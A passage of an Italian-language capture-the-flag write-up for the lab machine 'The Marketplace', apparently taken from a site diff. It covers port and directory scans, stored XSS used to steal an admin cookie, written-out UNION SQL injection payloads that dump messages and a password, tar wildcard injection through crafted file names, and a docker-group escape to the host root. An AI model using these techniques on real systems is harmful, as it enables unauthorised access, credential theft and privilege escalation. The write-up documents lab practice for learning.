+</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">203</span>.49<span class="w"> </span>seconds<span class="w">                  </span>
+</span></code></pre></div></td></tr></table></div>
+<p>Sono presenti 3 servizi pubblicamente esposti</p>
+<table>
+<thead>
+<tr>
+<th>Servizio</th>
+<th>Porta</th>
+<th>Versione</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ssh</td>
+<td>22</td>
+<td>OpenSSH 7.6p1</td>
+</tr>
+<tr>
+<td>http</td>
+<td>80</td>
+<td>nginx 1.19.2</td>
+</tr>
+<tr>
+<td>http</td>
+<td>32768</td>
+<td>node.js</td>
+</tr>
+</tbody>
+</table>
+<p>Da quello che credo il servizio nella porta 80 è solamente un reverse proxy verso il servizio node.js (porta 32768) quindi il servizio web è esposto in 32768 e nginx lo serve sulla porta 80.</p>
+<p>Intanto eseguiamo enumerazione dei percorsi nel servizio web</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-2-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-2-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-2-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-2-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-2-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-2-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-2-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-2-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-2-10">10</a></span>
+<span class="normal"><a href="#__codelineno-2-11">11</a></span>
+<span class="normal"><a href="#__codelineno-2-12">12</a></span>
+<span class="normal"><a href="#__codelineno-2-13">13</a></span>
+<span class="normal"><a href="#__codelineno-2-14">14</a></span>
+<span class="normal"><a href="#__codelineno-2-15">15</a></span>
+<span class="normal"><a href="#__codelineno-2-16">16</a></span>
+<span class="normal"><a href="#__codelineno-2-17">17</a></span>
+<span class="normal"><a href="#__codelineno-2-18">18</a></span>
+<span class="normal"><a href="#__codelineno-2-19">19</a></span>
+<span class="normal"><a href="#__codelineno-2-20">20</a></span>
+<span class="normal"><a href="#__codelineno-2-21">21</a></span>
+<span class="normal"><a href="#__codelineno-2-22">22</a></span>
+<span class="normal"><a href="#__codelineno-2-23">23</a></span>
+<span class="normal"><a href="#__codelineno-2-24">24</a></span>
+<span class="normal"><a href="#__codelineno-2-25">25</a></span>
+<span class="normal"><a href="#__codelineno-2-26">26</a></span>
+<span class="normal"><a href="#__codelineno-2-27">27</a></span>
+<span class="normal"><a href="#__codelineno-2-28">28</a></span>
+<span class="normal"><a href="#__codelineno-2-29">29</a></span>
+<span class="normal"><a href="#__codelineno-2-30">30</a></span>
+<span class="normal"><a href="#__codelineno-2-31">31</a></span>
+<span class="normal"><a href="#__codelineno-2-32">32</a></span>
+<span class="normal"><a href="#__codelineno-2-33">33</a></span>
+<span class="normal"><a href="#__codelineno-2-34">34</a></span>
+<span class="normal"><a href="#__codelineno-2-35">35</a></span>
+<span class="normal"><a href="#__codelineno-2-36">36</a></span>
+<span class="normal"><a href="#__codelineno-2-37">37</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>kali@kali:~/Desktop/CTF/TheMarketplace$<span class="w"> </span>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://market.local<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/common.txt<span class="w"> </span>-x<span class="w"> </span><span class="s2">".txt,.js"</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a><span class="o">===============================================================</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a>Gobuster<span class="w"> </span>v3.8.2
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a>by<span class="w"> </span>OJ<span class="w"> </span>Reeves<span class="w"> </span><span class="o">(</span>@TheColonial<span class="o">)</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>Christian<span class="w"> </span>Mehlmauer<span class="w"> </span><span class="o">(</span>@firefart<span class="o">)</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a><span class="o">===============================================================</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Url:<span class="w">                     </span>http://market.local
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Method:<span class="w">                  </span>GET
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Threads:<span class="w">                 </span><span class="m">10</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Wordlist:<span class="w">                </span>/usr/share/seclists/Discovery/Web-Content/common.txt
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Negative<span class="w"> </span>Status<span class="w"> </span>codes:<span class="w">   </span><span class="m">404</span>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>Agent:<span class="w">              </span>gobuster/3.8.2
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Extensions:<span class="w">              </span>txt,js
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Timeout:<span class="w">                 </span><span class="nv">10s</span>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14"></a><span class="o">===============================================================</span>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15"></a>Starting<span class="w"> </span>gobuster<span class="w"> </span><span class="k">in</span><span class="w"> </span>directory<span class="w"> </span>enumeration<span class="w"> </span><span class="nv">mode</span>
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16"></a><span class="o">===============================================================</span>
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17"></a>.hta<span class="w">                 </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">153</span><span class="o">]</span>
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18"></a>.hta.txt<span class="w">             </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">153</span><span class="o">]</span>
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19"></a>.hta.js<span class="w">              </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">153</span><span class="o">]</span>
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20"></a>.htaccess<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">153</span><span class="o">]</span>
+</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21"></a>.htaccess.txt<span class="w">        </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">153</span><span class="o">]</span>
+</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22"></a>.htaccess.js<span class="w">         </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">153</span><span class="o">]</span>
+</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23"></a>.htpasswd<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">153</span><span class="o">]</span>
+</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24"></a>.htpasswd.txt<span class="w">        </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">153</span><span class="o">]</span>
+</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25"></a>.htpasswd.js<span class="w">         </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">153</span><span class="o">]</span>
+</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26"></a>ADMIN<span class="w">                </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">392</span><span class="o">]</span>
+</span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27"></a>Admin<span class="w">                </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">392</span><span class="o">]</span>
+</span><span id="__span-2-28"><a id="__codelineno-2-28" name="__codelineno-2-28"></a>Login<span class="w">                </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">857</span><span class="o">]</span>
+</span><span id="__span-2-29"><a id="__codelineno-2-29" name="__codelineno-2-29"></a>admin<span class="w">                </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">392</span><span class="o">]</span>
+</span><span id="__span-2-30"><a id="__codelineno-2-30" name="__codelineno-2-30"></a>images<span class="w">               </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">179</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>/images/<span class="o">]</span>
+</span><span id="__span-2-31"><a id="__codelineno-2-31" name="__codelineno-2-31"></a>login<span class="w">                </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">857</span><span class="o">]</span>
+</span><span id="__span-2-32"><a id="__codelineno-2-32" name="__codelineno-2-32"></a>messages<span class="w">             </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">302</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">28</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>/login<span class="o">]</span>
+</span><span id="__span-2-33"><a id="__codelineno-2-33" name="__codelineno-2-33"></a>new<span class="w">                  </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">302</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">28</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>/login<span class="o">]</span>
+</span><span id="__span-2-34"><a id="__codelineno-2-34" name="__codelineno-2-34"></a>robots.txt<span class="w">           </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">31</span><span class="o">]</span>
+</span><span id="__span-2-35"><a id="__codelineno-2-35" name="__codelineno-2-35"></a>robots.txt<span class="w">           </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">31</span><span class="o">]</span>
+</span><span id="__span-2-36"><a id="__codelineno-2-36" name="__codelineno-2-36"></a>signup<span class="w">               </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">667</span><span class="o">]</span>
+</span><span id="__span-2-37"><a id="__codelineno-2-37" name="__codelineno-2-37"></a>stylesheets<span class="w">          </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">189</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>/stylesheets/<span class="o">]</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Registrandoci e poi loggandoci, e poi cliccando <code>New Listing</code>  possiamo creare un nuovo prodotto</p>
+<p><img alt="image.png" src="../assets/the-marketplace/image.png" /></p>
+<p>E una volta creato è possibile reportarlo agli admin che lo visionano</p>
+<p><img alt="image.png" src="../assets/the-marketplace/image-1.png" /></p>
+<p>Quello che mi è venuto in mente è che se è vulnerabile ad <code>XSS</code>  questo campo possiamo reportare agli admin un articolo costruito ad hoc per rubare i cookie di accesso dell’admin.</p>
+<p>Per questo usando <code>Burp Suite</code> ho costruito un sempliccismo test <code>XSS</code> </p>
+<p><img alt="image.png" src="../assets/the-marketplace/image-2.png" /></p>
+<p><img alt="image.png" src="../assets/the-marketplace/image-3.png" /></p>
+<p>Andato con successo ora al posto di stampare un semplice <code>1</code>  stampiamo i cookie</p>
+<p><img alt="image.png" src="../assets/the-marketplace/image-4.png" /></p>
+<p>Ora quello che dobbiamo fare un JS che invia questi cookie alla nostra <code>kali</code> </p>
+<p><img alt="image.png" src="../assets/the-marketplace/image-5.png" /></p>
+<p><img alt="image.png" src="../assets/the-marketplace/image-6.png" /></p>
+<p>Funziona effettivamente, ora reportiamo l’articolo e speriamo che l’admin lo legga!</p>
+<p><img alt="image.png" src="../assets/the-marketplace/image-7.png" /></p>
+<p><img alt="image.png" src="../assets/the-marketplace/image-8.png" /></p>
+<p>Ha funzionato!! abbiamo i suoi cookie. Ora ci logghiamo con il suo cookie</p>
+<p><img alt="image.png" src="../assets/the-marketplace/image-9.png" /></p>
+<p>E otteniamo la prima flag.</p>
+<p>Ora ci sono tre utenti nel sistema: <code>system</code>, <code>michael</code>, <code>jake</code> gli altri sono utenti creati da me di test. Importanti sono <code>michael</code> e <code>jake</code>  che sono amministratori.</p>
+<p>Provando a rompere l’url della ricerca utenti</p>
+<p><img alt="image.png" src="../assets/the-marketplace/image-10.png" /></p>
+<p>Possiamo sfruttare cio’ per creare un SQLi</p>
+<p>Cominciamo a trovare con quante colonne viene usata la select</p>
+<p><img alt="image.png" src="../assets/the-marketplace/image-11.png" /></p>
+<p><img alt="image.png" src="../assets/the-marketplace/image-12.png" /></p>
+<p>Quattro colonne! ora cominciamo ad enumerare il database</p>
+<p>Con <code>/admin?user=1 UNION SELECT database(),2,3,4 LIMIT 1 OFFSET 1-- -</code></p>
+<p>Otteniamo che il database si chiama <code>marketplace</code></p>
+<p>Con <code>/admin?user=1 UNION SELECT group_concat(table_name),2,3,4 FROM information_schema.tables WHERE table_schema='marketplace' LIMIT 1 OFFSET 1-- -</code></p>
+<p>Otteniamo <code>3</code> tabelle: <strong><code>items,messages,users</code></strong></p>
+<p>Con <code>/admin?user=1 UNION SELECT group_concat(column_name),2,3,4 FROM information_schema.columns WHERE table_name='messages' LIMIT 1 OFFSET 1-- -</code> </p>
+<p>Otteniamo le colonne della tabella messages: <code>id,is_read,message_content,user_from,user_to</code> </p>
+<p>Con <code>/admin?user=1 UNION SELECT group_concat('from',':', user_from,' to: ', user_to , '-&gt; ', message_content SEPARATOR '&lt;br&gt;'),2,3,4 FROM messages LIMIT 1 OFFSET 1-- -</code></p>
+<p>Otteniamo tutti i messaggi, ben separati</p>
+<p><img alt="image.png" src="../assets/the-marketplace/image-13.png" /></p>
+<p>La password di <code>Jake</code> (User 3) è quindi <strong><code>@b_ENXkGYUCAv3zJ</code></strong> possiamo quindi collegarci in SSH</p>
+<p><img alt="image.png" src="../assets/the-marketplace/image-14.png" /></p>
+<p>Dove troviamo la seconda flag</p>
+<p><img alt="image.png" src="../assets/the-marketplace/image-15.png" /></p>
+<p>Ora dobbiamo fare privileage escalation e cercare di diventare <code>root</code> </p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
+<span class="normal"><a href="#__codelineno-3-2">2</a></span>
+<span class="normal"><a href="#__codelineno-3-3">3</a></span>
+<span class="normal"><a href="#__codelineno-3-4">4</a></span>
+<span class="normal"><a href="#__codelineno-3-5">5</a></span>
+<span class="normal"><a href="#__codelineno-3-6">6</a></span>
+<span class="normal"><a href="#__codelineno-3-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>jake@the-marketplace:~$<span class="w"> </span>sudo<span class="w"> </span>-l
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>Matching<span class="w"> </span>Defaults<span class="w"> </span>entries<span class="w"> </span><span class="k">for</span><span class="w"> </span>jake<span class="w"> </span>on<span class="w"> </span>the-marketplace:
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a><span class="w">    </span>env_reset,<span class="w"> </span>mail_badpass,<span class="w"> </span><span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5"></a>User<span class="w"> </span>jake<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>the-marketplace:
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6"></a><span class="w">    </span><span class="o">(</span>michael<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>/opt/backups/backup.sh
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7"></a>jake@the-marketplace:~$<span class="w"> </span>
+</span></code></pre></div></td></tr></table></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
+<span class="normal"><a href="#__codelineno-4-2">2</a></span>
+<span class="normal"><a href="#__codelineno-4-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>jake@the-marketplace:~$<span class="w"> </span>ls<span class="w"> </span>-al<span class="w"> </span>/opt/backups/backup.sh
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>-rwxr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>michael<span class="w"> </span>michael<span class="w"> </span><span class="m">73</span><span class="w"> </span>Aug<span class="w"> </span><span class="m">23</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>/opt/backups/backup.sh
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>jake@the-marketplace:~$<span class="w"> </span>
+</span></code></pre></div></td></tr></table></div>
+<p>L’utente <code>jake</code> può eseguire questo file con i permessi di <code>michael</code>  </p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span>
+<span class="normal"><a href="#__codelineno-5-2">2</a></span>
+<span class="normal"><a href="#__codelineno-5-3">3</a></span>
+<span class="normal"><a href="#__codelineno-5-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>jake@the-marketplace:~$<span class="w"> </span>cat<span class="w"> </span>/opt/backups/backup.sh<span class="w"> </span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a><span class="c1">#!/bin/bash</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">"Backing up files..."</span><span class="p">;</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4"></a>tar<span class="w"> </span>cf<span class="w"> </span>/opt/backups/backup.tar<span class="w"> </span>*
+</span></code></pre></div></td></tr></table></div>
+<p>fa essenzialmente un backup in formato <strong><code>.tar</code></strong> di tutto ciò che <code>*</code> espande nella directory corrente.</p>
+<p>Guardando da <code>gtfobins.org</code> è possibile aprire una <code>shell</code> con <code>tar</code> in questo caso si aprirebbe con i permessi massimi di root.</p>
+<p><img alt="image.png" src="../assets/the-marketplace/image-16.png" /></p>
+<p>Il nostro scopo è quello di creare quindi un file nella directory <code>/opt/backups/</code> di nome </p>
+<p><code>--checkpoint=1 --checkpoint-action=exec=/bin/sh</code></p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
+<span class="normal"><a href="#__codelineno-6-2">2</a></span>
+<span class="normal"><a href="#__codelineno-6-3">3</a></span>
+<span class="normal"><a href="#__codelineno-6-4">4</a></span>
+<span class="normal"><a href="#__codelineno-6-5">5</a></span>
+<span class="normal"><a href="#__codelineno-6-6">6</a></span>
+<span class="normal"><a href="#__codelineno-6-7">7</a></span>
+<span class="normal"><a href="#__codelineno-6-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>jake@the-marketplace:/opt/backups$<span class="w"> </span>ll
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a>total<span class="w"> </span><span class="m">16</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a>drwxrwxrwt<span class="w"> </span><span class="m">2</span><span class="w"> </span>root<span class="w">    </span>root<span class="w">    </span><span class="m">4096</span><span class="w"> </span>Oct<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">21</span>:16<span class="w">  </span>./
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4"></a>drwxr-xr-x<span class="w"> </span><span class="m">4</span><span class="w"> </span>root<span class="w">    </span>root<span class="w">    </span><span class="m">4096</span><span class="w"> </span>Aug<span class="w"> </span><span class="m">23</span><span class="w">  </span><span class="m">2020</span><span class="w">  </span>../
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5"></a>-rwxr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>michael<span class="w"> </span>michael<span class="w">   </span><span class="m">73</span><span class="w"> </span>Aug<span class="w"> </span><span class="m">23</span><span class="w">  </span><span class="m">2020</span><span class="w">  </span>backup.sh*
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6"></a>-rw-rw-r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>jake<span class="w">    </span>jake<span class="w">       </span><span class="m">0</span><span class="w"> </span>Oct<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">21</span>:04<span class="w"> </span><span class="s1">'--checkpoint=1'</span>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7"></a>-rw-rw-r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>jake<span class="w">    </span>jake<span class="w">       </span><span class="m">0</span><span class="w"> </span>Oct<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">21</span>:05<span class="w"> </span><span class="s1">'--checkpoint-action=exec=sh'</span>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8"></a>-rw-rw-r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>jake<span class="w">    </span>jake<span class="w">       </span><span class="m">5</span><span class="w"> </span>Oct<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">21</span>:02<span class="w">  </span>test.txt
+</span></code></pre></div></td></tr></table></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
+<span class="normal"><a href="#__codelineno-7-2">2</a></span>
+<span class="normal"><a href="#__codelineno-7-3">3</a></span>
+<span class="normal"><a href="#__codelineno-7-4">4</a></span>
+<span class="normal"><a href="#__codelineno-7-5">5</a></span>
+<span class="normal"><a href="#__codelineno-7-6">6</a></span>
+<span class="normal"><a href="#__codelineno-7-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>jake@the-marketplace:/opt/backups$<span class="w"> </span>sudo<span class="w"> </span>-u<span class="w"> </span>michael<span class="w"> </span>/opt/backups/backup.sh
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a>Backing<span class="w"> </span>up<span class="w"> </span>files...
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3"></a>$<span class="w"> </span>ls
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4"></a><span class="w"> </span>backup.sh<span class="w">   </span>backup.tar<span class="w">  </span><span class="s1">'--checkpoint=1'</span><span class="w">  </span><span class="s1">'--checkpoint-action=exec=sh'</span><span class="w">   </span>test.txt
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5"></a>$<span class="w"> </span>whoami
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6"></a>michael
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7"></a>$<span class="w"> </span>
+</span></code></pre></div></td></tr></table></div>
+<p>E appartiene anche al gruppo <code>docker</code> </p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span>
+<span class="normal"><a href="#__codelineno-8-2">2</a></span>
+<span class="normal"><a href="#__codelineno-8-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>michael@the-marketplace:/home/michael$<span class="w"> </span>groups
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a>michael<span class="w"> </span>docker
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3"></a>michael@the-marketplace:/home/michael$<span class="w"> </span>
+</span></code></pre></div></td></tr></table></div>
+<p>Usiamo quindi questa caratteristica per creare un container e montarlo dentro l’intero filesystem <code>/</code> dell’host <code>-v /:/mnt</code> </p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span>
+<span class="normal"><a href="#__codelineno-9-2">2</a></span>
+<span class="normal"><a href="#__codelineno-9-3">3</a></span>
+<span class="normal"><a href="#__codelineno-9-4">4</a></span>
+<span class="normal"><a href="#__codelineno-9-5">5</a></span>
+<span class="normal"><a href="#__codelineno-9-6">6</a></span>
+<span class="normal"><a href="#__codelineno-9-7">7</a></span>
+<span class="normal"><a href="#__codelineno-9-8">8</a></span>
+<span class="normal"><a href="#__codelineno-9-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>michael@the-marketplace:/home/michael$<span class="w"> </span>docker<span class="w"> </span>run<span class="w"> </span>-it<span class="w"> </span>--rm<span class="w"> </span>-v<span class="w"> </span>/:/mnt<span class="w"> </span>alpine<span class="w"> </span>chroot<span class="w"> </span>/mnt<span class="w"> </span>/bin/sh
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a><span class="c1"># ls</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3"></a>bin<span class="w">  </span>boot<span class="w">  </span>cdrom<span class="w">  </span>dev<span class="w">  </span>etc<span class="w">  </span>home<span class="w">  </span>initrd.img<span class="w">  </span>initrd.img.old<span class="w">  </span>lib<span class="w">  </span>lib64<span class="w">  </span>lost+found<span class="w">  </span>media<span class="w">  </span>mnt<span class="w">  </span>opt<span class="w">  </span>proc<span class="w">  </span>root<span class="w">  </span>run<span class="w">  </span>sbin<span class="w">  </span>srv<span class="w">  </span>swap.img<span class="w">  </span>sys<span class="w">  </span>tmp<span class="w">  </span>usr<span class="w">  </span>var<span class="w">  </span>vmlinuz<span class="w">  </span>vmlinuz.old
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4"></a><span class="c1"># cd /root</span>
